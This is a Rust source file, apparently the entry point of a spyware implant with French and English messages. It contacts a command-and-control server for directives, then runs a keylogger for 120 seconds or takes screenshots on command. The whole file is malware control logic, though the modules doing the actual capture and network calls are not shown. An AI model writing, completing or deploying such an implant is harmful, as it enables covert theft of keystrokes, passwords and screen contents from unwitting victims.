mod connexion;
mod input;
mod screenshot;

#[tokio::main]
async fn main() {
    match connexion::get_directives().await {
        Ok(commands) => {
            println!("Commands received: {:?}", commands);
            for command in commands {
                match command.as_str() {
                    "keylogger" => {
                        tokio::spawn(async {
                            input::start_keylogger(120).await;
                        });
                    }
                    "screenshot" => {
                        let handle = tokio::spawn(async {
                            screenshot::take_screenshot().await;
                        });

                        if let Err(e) = handle.await {
                            eprintln!("La tâche screenshot a échoué : {:?}", e);
                        }
                    }
                    _ => println!("Commande inconnue: {}", command),
                }
            }
        }
        Err(e) => eprintln!("Erreur avec la connexion au C2: {}", e),
    }
}
